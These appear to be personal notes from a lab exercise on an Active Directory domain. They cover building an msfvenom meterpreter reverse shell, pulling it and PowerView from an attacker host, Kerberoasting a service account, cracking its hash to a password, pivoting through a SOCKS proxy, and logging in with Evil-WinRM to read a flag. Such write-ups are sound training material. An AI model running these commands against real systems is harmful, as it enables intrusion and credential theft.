---
created: 2026-08-15
updated: 2026-08-15
---
## Uploading a reverse shell

- Generate a shell using `msfvenom`:

```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.14.228 LPORT=4444 -f exe -o shell.exe
```

- Serve the shell from your machine:

```bash
python -m http.server 8080
```

- Download the shell to the target machine:

```bash
Invoke-WebRequest -Uri "http://10.10.14.228:8080/shell.exe" -OutFile "C:\Windows\System32\inetsrv\shell.exe"
```

- Start a listener:

```bash
msfconsole -q
use exploit/multi/handler
set LHOST 10.10.14.229
set LPORT 4444
set payload windows/meterpreter_reverse_tcp
run
```

- Execute the shell:

```bash
shell.exe
```

## Kerberoasting
### Transferring PowerView

- Download the shell to the attacker machine and serve it:

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
```

```bash
python -m http.server 8080
```

- Download to the target machine:

```powershell
Invoke-WebRequest -Uri "http://10.10.14.228:8080/PowerView.ps1" -OutFile "C:\Windows\System32\inetsrv\PowerView.ps1"
```

- Import module on the target:

```powershell
Import-Module .\PowerView.ps1
```

### Enumerating accounts with SPNs

- Enumerate accounts with SPNs:

```powershell
Get-DomainUser * -SPN | Select-Object samaccountname, serviceprincipalname
```

```powershell
samaccountname serviceprincipalname                       
-------------- --------------------                       
azureconnect   adfsconnect/azure01.inlanefreight.local    
backupjob      backupjob/veam001.inlanefreight.local      
krbtgt         kadmin/changepw                            
sqltest        MSSQLSvc/DEVTEST.inlanefreight.local:1433  
sqlqa          MSSQLSvc/QA001.inlanefreight.local:1433    
sqldev         MSSQLSvc/SQL-DEV01.inlanefreight.local:1433
svc_sql        MSSQLSvc/SQL01.inlanefreight.local:1433    
sqlprod        MSSQLSvc/SQL02.inlanefreight.local:1433   
```

### Roasting the ticket

- Request a ticket in the Hashcat format:

```bash
Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
```

```bash
SamAccountName       : svc_sql
DistinguishedName    : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/SQL01.inlanefreight.local:1433
TicketByteHexStream  : 
Hash                 : krb5tgs23*svcsqlINLANEFREIGHT.LOCALMSSQLSvc/SQL01.inlanefreight.local:1433*F2C716B971BE178EA0C92F5275A79FDF$CCDE308B78004776895CD02D0115B0BA82E232EDE7FC753759B097D29C9203F3B5E67C30C419D8D538B591D6643E1AE730F12313FCF59042AEBE5EAC3D8A5116F547E149BC0F8D80A7D58CFA3CB8EE318438165B0B9B91550ECFD31DE8B1109EA7503694916D95A09D13D63821917E11CF578FDD464B6944463FC96F61D71EB61505ADB835D040C21DC249297AEB3D7A5AE8EFC8DB9055C3CE7C62FBB8FBA3F469F5C1E8E67AE2A49A8ED57DFF58CC4F4F4B0B0C947B525078910F93720ED6E052AA38BE321E390BD272EDD1B508A888751EC078917F2856E504586BEF821C368C4B969DB348503A3B0C5B04611FB280416AEE40A5514E2DF71A624AABF99C79B330439A7723594ECB0538CAE5CB05D121E675A82AB7307328429F829171F6F61408B067A1105F853FF1C305A63F41BF250C9A06D97E1371E344F23D703202445B9FCBF216D8FD52E0C92726003904999227EB7F061BA6FE214B696703FBF40AFBA3D7427C7BEAFF10E948F3E25D071EA8DFC09CF8EA642379F353375ED33A32614C0FE5E03326E6BB69964CE162BC8984E6EC9C1EC9CE22667AEEA69BCDDCF28082F3DDD631E2E7DFAE5C8CD7E46B2EBA290E5F0396142B99BD84A8BBD0083BE46C084CE1E3FB9B836E67317ED1116DB60C7E7B77C93A110D15F1494251CFA1F80AF928AB24C15DA284BDB59787132EE0C9BE0E1DF2BFEF6CB0302BFE7DBCA4BF74F2AD720409820ACA1F298DF1313D8013131A1744B747D77CEFD31DB270C41D2A8522A3EA6215C48141C96F5D7432E35A73C213CF40F0985C625255E2C66699E3C313F60C30CBE028429B1D0EF8B7A07AC64320ED028CA171FDA163CFB97CB1C1311D473B84DC70589A9018C0206E7B6252396C10D2BC23913CCB9EF26031927623CBA8DDF0C7882943DFCEB3B0EB111420664EA8D67E5B4279E3F5B7B78F7A1195E019A713D4390BF1ABAD575AC304EAB5115A02E70EB56F68B956208D95F925F594D849FB7F30AA9536413E6E8583DE38F5323679A24C97801BBD806E5921B4360E8ACB5F2B1B33A45A1388B321ACF20BF2CCEBC89AE7220129FF2AA08D5F68BEA527843B2F35DD5E89939DA6113C60BCB40421537D421C3726CD327D1116EFAD50BE44384DA24928231EAE64D5C97DF3C69A55A81028549AB89D6F151A922A960458E9D27363DC97226BA08D1A37B271396B0819752317B67B4837C261AFF117302F2518BF359784B0BA21A80B92E1D7A2CFDDD94201BD540C12BE0A3EF6597207E65CE95DE6689D53AADDC18D59040FE0F14CC68FF2B2000C121E8C84FA234D18F5EDD1F7CCB9EEE2E6D621C96794EC0D2A97B2D0E7E94D47536DE9F85686556B0F04E0D87DA29DB5D780D5372CF68AF94357B3988DAE98CCE9196E585F5DCD023DEA466C49E15D0FBA771B774ADAFA6CAC1AEEBED915F1F957CB08221CBCF9050DE70C1DCB9244DAA4EA4FAE43871CBDF2B76CB5978A428DE9C57BFF66826D63515F21EF3E947C88B32769D077ED011F2C3B77F8
```

### Cracking the ticket

```bash
hashcat -a 0 -m 13100 hash.txt /home/user/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) Ultra 5 125U, 2914/5893 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /home/user/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 2 secs

krb5tgs23*svcsqlINLANEFREIGHT.LOCALMSSQLSvc/SQL01.inlanefreight.local:1433*f2c716b971be178ea0c92f5275a79fdf$ccde308b78004776895cd02d0115b0ba82e232ede7fc753759b097d29c9203f3b5e67c30c419d8d538b591d6643e1ae730f12313fcf59042aebe5eac3d8a5116f547e149bc0f8d80a7d58cfa3cb8ee318438165b0b9b91550ecfd31de8b1109ea7503694916d95a09d13d63821917e11cf578fdd464b6944463fc96f61d71eb61505adb835d040c21dc249297aeb3d7a5ae8efc8db9055c3ce7c62fbb8fba3f469f5c1e8e67ae2a49a8ed57dff58cc4f4f4b0b0c947b525078910f93720ed6e052aa38be321e390bd272edd1b508a888751ec078917f2856e504586bef821c368c4b969db348503a3b0c5b04611fb280416aee40a5514e2df71a624aabf99c79b330439a7723594ecb0538cae5cb05d121e675a82ab7307328429f829171f6f61408b067a1105f853ff1c305a63f41bf250c9a06d97e1371e344f23d703202445b9fcbf216d8fd52e0c92726003904999227eb7f061ba6fe214b696703fbf40afba3d7427c7beaff10e948f3e25d071ea8dfc09cf8ea642379f353375ed33a32614c0fe5e03326e6bb69964ce162bc8984e6ec9c1ec9ce22667aeea69bcddcf28082f3ddd631e2e7dfae5c8cd7e46b2eba290e5f0396142b99bd84a8bbd0083be46c084ce1e3fb9b836e67317ed1116db60c7e7b77c93a110d15f1494251cfa1f80af928ab24c15da284bdb59787132ee0c9be0e1df2bfef6cb0302bfe7dbca4bf74f2ad720409820aca1f298df1313d8013131a1744b747d77cefd31db270c41d2a8522a3ea6215c48141c96f5d7432e35a73c213cf40f0985c625255e2c66699e3c313f60c30cbe028429b1d0ef8b7a07ac64320ed028ca171fda163cfb97cb1c1311d473b84dc70589a9018c0206e7b6252396c10d2bc23913ccb9ef26031927623cba8ddf0c7882943dfceb3b0eb111420664ea8d67e5b4279e3f5b7b78f7a1195e019a713d4390bf1abad575ac304eab5115a02e70eb56f68b956208d95f925f594d849fb7f30aa9536413e6e8583de38f5323679a24c97801bbd806e5921b4360e8acb5f2b1b33a45a1388b321acf20bf2ccebc89ae7220129ff2aa08d5f68bea527843b2f35dd5e89939da6113c60bcb40421537d421c3726cd327d1116efad50be44384da24928231eae64d5c97df3c69a55a81028549ab89d6f151a922a960458e9d27363dc97226ba08d1a37b271396b0819752317b67b4837c261aff117302f2518bf359784b0ba21a80b92e1d7a2cfddd94201bd540c12be0a3ef6597207e65ce95de6689d53aaddc18d59040fe0f14cc68ff2b2000c121e8c84fa234d18f5edd1f7ccb9eee2e6d621c96794ec0d2a97b2d0e7e94d47536de9f85686556b0f04e0d87da29db5d780d5372cf68af94357b3988dae98cce9196e585f5dcd023dea466c49e15d0fba771b774adafa6cac1aeebed915f1f957cb08221cbcf9050de70c1dcb9244daa4ea4fae43871cbdf2b76cb5978a428de9c57bff66826d63515f21ef3e947c88b32769d077ed011f2c3b77f8:lucky7
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: krb5tgs23*svcsqlINLANEFREIGHT.LOCAL$MSSQLSvc/S...3b77f8
Time.Started.....: Sat Aug 15 11:57:10 2026 (0 secs)
Time.Estimated...: Sat Aug 15 11:57:10 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/user/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   564.8 kH/s (3.36ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3072/14344384 (0.02%)
Rejected.........: 0/3072 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> dangerous

Started: Sat Aug 15 11:57:07 2026
Stopped: Sat Aug 15 11:57:12 2026
```

## `MS01`

- Ping the machine:

```powershell
PS C:\windows\system32\inetsrv> ping MS01
ping MS01

Pinging MS01.INLANEFREIGHT.LOCAL [172.16.6.50] with 32 bytes of data:
Reply from 172.16.6.50: bytes=32 time=1ms TTL=128
Reply from 172.16.6.50: bytes=32 time<1ms TTL=128
Reply from 172.16.6.50: bytes=32 time<1ms TTL=128
Reply from 172.16.6.50: bytes=32 time<1ms TTL=128

Ping statistics for 172.16.6.50:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 1ms, Average = 0ms
```

### Setting a proxy

- Set a proxy:

```bash
auxiliary/server/socks_proxy
```

```bash
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```

- Then route the traffic through the Meterpreter session:

```bash
use multi/manage/autoroute
```

```bash
set SESSION 1  
set SUBNET 172.16.6.0  
run
```

### `Evil-WinRM`

```bash
proxychains evil-winrm -i 172.16.6.50 -u svc_sql -p lucky7
```

```
*Evil-WinRM* PS C:\Users\Administrator> cat C:\Users\Administrator\Desktop\flag.txt
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.6.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.6.50:5985-<><>-OK
spn$_r0ast1ng_on_@n_0p3n_f1re
```

### Credential hunting

